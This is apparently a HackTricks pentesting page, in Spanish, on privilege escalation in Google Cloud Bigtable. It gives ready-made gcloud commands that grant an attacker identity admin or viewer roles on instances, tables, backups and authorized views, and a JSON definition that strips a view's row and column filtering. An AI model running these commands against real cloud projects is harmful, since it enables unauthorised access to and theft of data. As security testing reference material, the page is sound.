# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Para más información sobre Bigtable consulta:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**Permisos:** `bigtable.instances.setIamPolicy` (y normalmente `bigtable.instances.getIamPolicy` para leer las asignaciones actuales).

Poseer la política IAM de la instancia te permite concederte **`roles/bigtable.admin`** (o cualquier rol personalizado), lo cual se propaga a cada clúster, tabla, copia de seguridad y vista autorizada en la instancia.

<details><summary>Otórgate el rol bigtable.admin en la instancia</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Si no puedes listar los bindings existentes, crea un documento de policy nuevo y súbelo con `gcloud bigtable instances set-iam-policy` siempre que te mantengas a ti mismo en él.

Con este permiso, revisa la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver más técnicas para abusar de los permisos de Bigtable.

### `bigtable.tables.setIamPolicy`

**Permisos:** `bigtable.tables.setIamPolicy` (opcionalmente `bigtable.tables.getIamPolicy`).

Las instance policies pueden estar restringidas mientras las tablas individuales son delegadas. Si puedes editar el IAM de la tabla, puedes **promoverte a owner del dataset objetivo** sin afectar otros workloads.

<details><summary>Concederte el rol bigtable.admin en la tabla</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Después de obtener este permiso, consulta la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para más formas de abusar de los permisos de Bigtable.


### `bigtable.backups.setIamPolicy`

**Permisos:** `bigtable.backups.setIamPolicy`

Los Backups se pueden restaurar en **cualquier instancia en cualquier proyecto** que controles. Primero, otorga a tu identidad acceso al backup, luego restáuralo en un sandbox donde tengas los roles Admin/Owner.

Si tienes el permiso `bigtable.backups.setIamPolicy`, podrías otorgarte a ti mismo el permiso `bigtable.backups.restore` para restaurar backups antiguos e intentar acceder a información sensible.

<details><summary>Take ownership of backup snapshot</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Con este permiso, revisa la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver cómo restaurar un backup.


### Actualizar Authorized View

**Permisos:** `bigtable.authorizedViews.update`

Los Authorized Views están pensados para redactar filas/columnas. Modificarlos o eliminarlos **elimina las protecciones de granularidad fina** en las que confían los defensores.

<details><summary>Actualizar Authorized View para ampliar el acceso</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Después de obtener este permiso, consulta la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver cómo leer desde una Authorized View.

### `bigtable.authorizedViews.setIamPolicy`

**Permisos:**  `bigtable.authorizedViews.setIamPolicy`.

Un atacante con este permiso puede concederse acceso a una Authorized View, la cual puede contener datos sensibles a los que, de otro modo, no tendría acceso.

<details><summary>Concederse acceso a Authorized View</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Después de realizar esta comprobación de permisos, consulta la [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) para ver cómo leer desde una vista autorizada.



{{#include ../../../banners/hacktricks-training.md}}
